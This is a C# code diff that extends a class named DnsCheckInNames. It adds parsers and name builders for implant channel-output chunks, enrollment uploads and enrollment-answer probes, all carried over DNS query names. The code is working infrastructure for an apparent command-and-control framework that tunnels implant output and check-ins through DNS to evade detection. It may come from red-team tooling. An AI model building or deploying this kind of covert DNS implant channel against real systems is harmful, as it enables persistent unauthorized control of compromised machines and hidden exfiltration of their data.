@@ -41,6 +41,28 @@ internal static class DnsCheckInNames
         byte[] Chunk);
 
     /// <summary>
+    /// One chunk of a live channel's output (architecture.md Sec 10.3, the
+    /// store-and-forward carriage over DNS): the chunks reassemble into one
+    /// marshaled ChannelOutput message.
+    /// </summary>
+    internal sealed record ChannelChunk(
+        ImplantId Implant,
+        TaskId Task,
+        int Sequence,
+        bool Terminal,
+        byte[] Chunk);
+
+    /// <summary>
+    /// One chunk of an enrollment upload (architecture.md Sec 8, enrollment
+    /// over DNS): the client-chosen stream id keys the reassembly, the
+    /// terminal chunk assembles the (sealed or plaintext) enroll body.
+    /// </summary>
+    internal sealed record EnrollChunk(byte[] Stream, int Sequence, bool Terminal, byte[] Chunk);
+
+    /// <summary>One probe of an enrollment answer: a token, a chunk index.</summary>
+    internal sealed record EnrollAnswerProbe(byte[] Token, int Sequence);
+
+    /// <summary>
     /// Parses a query name against <paramref name="zone"/>. Returns the poll
     /// or result-chunk view, or null when the name is not a check-in under
     /// this zone (other names in the zone are answered NXDOMAIN by the
@@ -95,6 +117,37 @@ internal static class DnsCheckInNames
         return new ResultChunk(implant, task, outcome.Value, sequence, terminal.Value, chunk);
     }
 
+    /// <summary>
+    /// Parses a channel-output chunk against <paramref name="zone"/>:
+    /// c.&lt;task&gt;.&lt;seq&gt;.&lt;t|m&gt;.&lt;chunk&gt;.&lt;implant&gt;.
+    /// </summary>
+    public static ChannelChunk? TryParseChannel(string name, string zone)
+    {
+        if (!TryStripZone(name, zone, out var labels))
+            return null;
+        if (labels.Length != 6 || labels[0] != "c")
+            return null;
+        if (!TryDecodeId(labels[5], out var implant))
+            return null;
+        if (!TryDecode(labels[1], out var taskBytes)
+            || !TaskId.TryParse(System.Text.Encoding.UTF8.GetString(taskBytes), out var task))
+            return null;
+        var terminal = labels[3] switch
+        {
+            "t" => true,
+            "m" => false,
+            _ => (bool?)null,
+        };
+        if (terminal is null || !int.TryParse(labels[2], out var sequence) || sequence < 0)
+            return null;
+        var chunk = labels[4] == "e"
+            ? Array.Empty<byte>()
+            : TryDecode(labels[4], out var decoded) ? decoded : null;
+        if (chunk is null)
+            return null;
+        return new ChannelChunk(implant, task, sequence, terminal.Value, chunk);
+    }
+
     /// <summary>Renders a poll name (the implant-side twin of the parser).</summary>
     public static string PollName(ImplantId implant, string zone)
         => $"p.{Encode(implant.ToString())}.{zone}";
@@ -110,6 +163,81 @@ internal static class DnsCheckInNames
             + "." + Encode(implant.ToString())
             + "." + zone;
 
+    /// <summary>
+    /// Renders a channel-output chunk name (the implant-side twin of the
+    /// parser): c.&lt;task&gt;.&lt;seq&gt;.&lt;t|m&gt;.&lt;chunk&gt;.&lt;implant&gt;.
+    /// </summary>
+    public static string ChannelName(
+        ImplantId implant, TaskId task, int sequence, bool terminal, byte[] chunk, string zone)
+        => "c." + Encode(task.ToString())
+            + "." + sequence.ToString(System.Globalization.CultureInfo.InvariantCulture)
+            + "." + (terminal ? "t" : "m")
+            + "." + (chunk.Length == 0 ? "e" : Encode(chunk))
+            + "." + Encode(implant.ToString())
+            + "." + zone;
+
+    /// <summary>
+    /// Parses an enrollment-upload chunk against <paramref name="zone"/>:
+    /// e.&lt;stream&gt;.&lt;seq&gt;.&lt;t|m&gt;.&lt;chunk&gt;.
+    /// </summary>
+    public static EnrollChunk? TryParseEnroll(string name, string zone)
+    {
+        if (!TryStripZone(name, zone, out var labels))
+            return null;
+        if (labels.Length != 5 || labels[0] != "e")
+            return null;
+        if (!TryDecode(labels[1], out var stream) || stream.Length == 0)
+            return null;
+        var terminal = labels[3] switch
+        {
+            "t" => true,
+            "m" => false,
+            _ => (bool?)null,
+        };
+        if (terminal is null || !int.TryParse(labels[2], out var sequence) || sequence < 0)
+            return null;
+        var chunk = labels[4] == "e"
+            ? Array.Empty<byte>()
+            : TryDecode(labels[4], out var decoded) ? decoded : null;
+        if (chunk is null)
+            return null;
+        return new EnrollChunk(stream, sequence, terminal.Value, chunk);
+    }
+
+    /// <summary>
+    /// Parses an enrollment-answer probe against <paramref name="zone"/>:
+    /// a.&lt;token&gt;.&lt;seq&gt;.
+    /// </summary>
+    public static EnrollAnswerProbe? TryParseEnrollAnswer(string name, string zone)
+    {
+        if (!TryStripZone(name, zone, out var labels))
+            return null;
+        if (labels.Length != 3 || labels[0] != "a")
+            return null;
+        if (!TryDecode(labels[1], out var token) || token.Length == 0)
+            return null;
+        if (!int.TryParse(labels[2], out var sequence) || sequence < 0)
+            return null;
+        return new EnrollAnswerProbe(token, sequence);
+    }
+
+    /// <summary>
+    /// Renders an enrollment-upload chunk name (the implant-side twin of
+    /// the parser).
+    /// </summary>
+    public static string EnrollName(byte[] stream, int sequence, bool terminal, byte[] chunk, string zone)
+        => "e." + Encode(stream)
+            + "." + sequence.ToString(System.Globalization.CultureInfo.InvariantCulture)
+            + "." + (terminal ? "t" : "m")
+            + "." + (chunk.Length == 0 ? "e" : Encode(chunk))
+            + "." + zone;
+
+    /// <summary>Renders an enrollment-answer probe name.</summary>
+    public static string EnrollAnswerName(byte[] token, int sequence, string zone)
+        => "a." + Encode(token)
+            + "." + sequence.ToString(System.Globalization.CultureInfo.InvariantCulture)
+            + "." + zone;
+
     /// <summary>The zone label suffix a name must end with, case-insensitive.</summary>
     private static bool TryStripZone(string name, string zone, out string[] labels)
     {
@@ -120,7 +248,7 @@ internal static class DnsCheckInNames
         if (head.Length == 0)
             return false;
         labels = head.Split('.');
-        return labels.Length > 0 && labels[0] is "p" or "r";
+        return labels.Length > 0 && labels[0] is "p" or "r" or "c" or "e" or "a";
     }
 
     private static bool TryDecodeId(string label, out ImplantId implant)
